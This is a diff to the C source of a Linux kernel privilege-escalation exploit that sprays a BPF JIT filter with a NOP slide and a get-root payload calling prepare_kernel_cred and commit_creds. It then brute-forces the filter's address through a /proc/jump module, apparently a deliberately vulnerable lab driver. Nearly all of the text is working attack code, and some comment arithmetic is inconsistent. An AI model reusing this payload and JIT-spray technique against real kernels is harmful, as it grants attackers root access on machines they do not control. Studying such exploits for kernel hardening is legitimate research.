@@ -205,12 +205,15 @@ void get_root(uint64_t payload_addr);
 //
 
 #define MODULE_START 0xffffffffa0000000UL
-#define MODULE_END   0xfffffffffff00000UL
+#define MODULE_END   0xffffffffff600000UL
 #define MODULE_PAGES ((MODULE_END - MODULE_START) / 0x1000)
 
 // The offset into the JIT-produced code page where we want to land.
 // This skips an "xor %eax, %eax" (31c0) and the initial b8 opcode.
 #define PAYLOAD_OFFSET 65
+//This offset allows to skip the max size of a hole when a filter
+// size is of 3964 bytes.
+#define HOLE_OFFSET 132
 
 // Some boring stuff.
 int      check_bpf_jit();
@@ -232,15 +235,16 @@ int socket_fds[2] = { -1, -1 };
 static int jump_fd;
 int urandom = -1;
 
+// BPF initialization code plus the final BPF_RET is 89 bytes
+// This payload is 5 + 35 + 5 + 35 + 5 = 85 bytes
 void emit_payload()
 {
-    emit1(0x90);
-    emit1(0x90);
-    // Embed a kernel get-root payload into the BPF program.
-    emit3(0x48, 0x31, 0xff);  // xor  %rdi, %rdi
-    emit_call(get_kernel_symbol("prepare_kernel_cred"));
-    emit3(0x48, 0x89, 0xc7);  // mov  %rax, %rdi
-    emit_call(get_kernel_symbol("commit_creds"));
+	// Embed a kernel get-root payload into the BPF program.
+	emit3(0x48, 0x31, 0xff);	// xor  %rdi, %rdi
+	emit_call(get_kernel_symbol("prepare_kernel_cred"));
+	emit3(0x48, 0x89, 0xc7);	// mov  %rax, %rdi
+	emit_call(get_kernel_symbol("commit_creds"));
+	emit1(0xc3);
 }
 
 int main() {
@@ -251,27 +255,34 @@ int main() {
     // debug output.  If we do, we can get the exact payload address.
     debug_enabled = check_bpf_jit();
 
-    //currently we need kptr_restrict to be 0 in order for the 
+    //currently we need kptr_restrict to be 0 in order for the
     // get_kernel_symbol() function to succeed.
-    // Real exploit would have to figure the address in some other way. 
+    // Real exploit would have to figure the address in some other way.
     check_kptr_restrict();
 
-    for(i=0;i<130;i++) {
-    	emit_payload();
-	emit1(0xc3);
+    // Create the filter program
+    // We want it to fit on one page: proglen + 128 + 4 <= 4096
+    // ---> proglen <= 3964
+    // payloadlen + BPF_RET_len = 174 ---> NOP_len <= 3790
+    // emit1(0x90) produces 5 bytes   ---> NOP_num =  758
+    // Create the NOP slide
+    for (i = 0; i < 758; i++) {
+        emit3(0x90, 0x90, 0x90);
     }
-    
+    // Put the exploit at the end of the page
+    emit_payload();
+    // The BPF program must end with a RET or the kernel will reject it.
+    emit_bpf(BPF_RET, 0);
+    filt.len = code_len;
+    info("code_len: %ld", code_len);
+    filt.filter = code;
+
     // Alternatively we could just disable SMEP by clearing bit 20 in
     // %cr4, and then jump to a traditional payload in a userspace
     // page.  This has that advantage that we don't immediately need
     // the address of any kernel function.  The traditional payload
     // can be a normal C function that searches for any kernel
     // functions or data we might need.
-
-    // The BPF program must end with a RET or the kernel will reject it.
-    emit_bpf(BPF_RET, 0);
-    filt.len    = code_len;
-    filt.filter = code;
 
     printf("[+] creating sockets");
     if (debug_enabled) {
@@ -305,10 +316,10 @@ int main() {
     printf("[+] guessing filter address");
     fflush(stdout);
     do {
-    	if (jump_fd)
+        if (jump_fd)
             close(jump_fd);
-    	// Prepare to exploit jump.ko.
-    	if ((jump_fd = open("/proc/jump", O_WRONLY)) < 0)
+        // Prepare to exploit jump.ko.
+        if ((jump_fd = open("/proc/jump", O_WRONLY)) < 0)
             errno_die("open(\"/proc/jump\")");
 	if (pgnumFinished == 1) {
             if ((unsigned int)(read(urandom, &pgnum, sizeof(pgnum)))
@@ -321,9 +332,9 @@ int main() {
         // So we fork off a child process to do the guessing.
         if (!(pid = fork())) {
             printf("\npgnum: %x, pgnumIncr: %d", pgnum, pgnumIncr);
-            printf("\nattempt: %lx", MODULE_START + (0x1000 * pgnum) + pgnumIncr);
+            printf("\nattempt: %lx", MODULE_START + (0x1000 * pgnum) + HOLE_OFFSET + pgnumIncr);
             fflush(stdout);
-            get_root(MODULE_START + (0x1000 * pgnum) + pgnumIncr);
+            get_root(MODULE_START + (0x1000 * pgnum) + HOLE_OFFSET + pgnumIncr);
             continue;
         } else {
 		if (pid < 0)
@@ -331,12 +342,12 @@ int main() {
 		if (TEMP_FAILURE_RETRY(waitpid(pid, &status, 0)) < 0)
 			errno_die("wait");
         }
-    	// Keep trying if the child got SIGKILL (probably due to kernel oops) or
-    	// exited by calling die().
+        // Keep trying if the child got SIGKILL (probably due to kernel oops) or
+        // exited by calling die().
 	if (pgnumFinished == 1) {
 	    pgnumFinished = 0;
 	    pgnumIncr = 1;
-	} else if (pgnumIncr == 10){
+	} else if (pgnumIncr == 1){
 	    //this is the last offset tried
 	    pgnumFinished = 1;
 	    pgnumIncr = 0;
@@ -350,8 +361,7 @@ int main() {
 		pgnumIncr = 0;
 	}
     }  while ((WIFSIGNALED(status) && (WTERMSIG(status) == SIGKILL))
-		 || (WIFEXITED(status)
-		     && (WEXITSTATUS(status) == FAILURE_CODE))
+		|| (WIFEXITED(status) && (WEXITSTATUS(status) == FAILURE_CODE))
 		|| (WIFEXITED(status) && (status == 0))
 		|| (WIFSIGNALED(status) && (WTERMSIG(status) == SIGSEGV)));
 
@@ -379,7 +389,6 @@ void get_root(uint64_t payload_addr) {
         fflush(stdout);
         die("failed to get root");
     }
-    printf("\ngot root!");
     fflush(stdout);
     info("got root!");
 
